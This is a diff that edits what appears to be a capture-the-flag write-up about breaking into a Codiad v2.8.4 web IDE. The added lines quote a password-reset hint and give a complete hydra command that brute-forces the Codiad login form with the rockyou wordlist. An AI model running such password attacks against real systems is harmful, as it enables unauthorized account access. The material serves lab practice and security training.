@@ -129,7 +129,25 @@ There is login page to codiad v2.8.4
 What is codiad?
 Codiad is an open-source web-based integrated development environment (IDE).
 
-I tried some default credentials but without any success.
+Remember this?
+
+```
+Hey john,
+I have reset the password as you have asked. Please use the default password to login. 
+Also, please take care of the image file ;)
+- drac.
+```
+I tried some default passwords till i made it.
+
+![image](https://cdn-images-1.medium.com/max/1000/1*HiQuMJxSJhQdaNdVxhxqMg.png)
+
+ If you don't know what is the password so I'll use hydra to get it:
+
+```
+hydra -l john -P /usr/share/wordlists/rockyou.txt <machine-ip> -s 62337 http-post-form "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:Incorrect Username or Password"
+```
+
+
 The next step is to check if there is any CVE to this codiad version to exploit with serachsploit.
 
 ```
